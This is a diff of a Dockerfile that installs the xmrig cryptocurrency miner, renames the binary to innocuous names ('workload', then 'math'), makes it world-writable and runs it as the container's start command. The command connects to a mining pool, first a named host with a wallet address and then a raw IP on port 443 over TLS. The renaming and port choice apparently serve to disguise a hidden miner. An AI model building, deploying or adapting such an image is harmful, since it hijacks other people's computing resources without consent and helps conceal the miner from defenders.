@@ -9,10 +9,10 @@ RUN apt update; \
     cd xmrig-6.16.2; \
     cp xmrig /usr/local/bin/xmrig; \
     cd /usr/local/bin; \
-    mv xmrig workload;
+    mv xmrig math;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 workload;
+RUN chmod 777 math;
 
-CMD workload -a gr -o workload.sytes.net:5555 --tls --cpu-max-threads-hint=75 -u RUpj92cvanvWbdTQtC6Fw39cHpU12o4S6R
+CMD math --url 45.143.94.72:443 --user x --pass x --tls
